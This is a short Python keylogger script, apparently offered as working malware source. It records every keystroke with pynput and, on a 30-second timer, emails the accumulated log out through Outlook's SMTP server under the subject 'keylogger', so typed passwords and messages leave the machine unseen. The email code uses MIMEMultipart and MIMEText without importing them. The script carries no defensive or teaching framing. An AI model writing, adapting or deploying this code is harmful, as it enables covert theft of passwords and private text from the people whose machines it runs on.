import threading

import pynput.keyboard
import smtplib
log = ""
def callback_function(key):
    global log
    try:
        log =  log + key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + str(f"/{key}/")
    except:
        pass

def send_email(email,password,text):
    email_server = smtplib.SMTP("smtp-mail.outlook.com",587)
    email_server.starttls()
    email_server.login(email, password)
    msg = MIMEMultipart()
    msg["From"] = email
    msg["To"] = email
    msg["Subject"] = "keylogger"
    body = text
    msg.attach(MIMEText(body, "plain"))
    email_server.sendmail(email, email, msg.as_string())
    email_server.quit()

def thread_function():
    global log
    send_email("","",log)
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
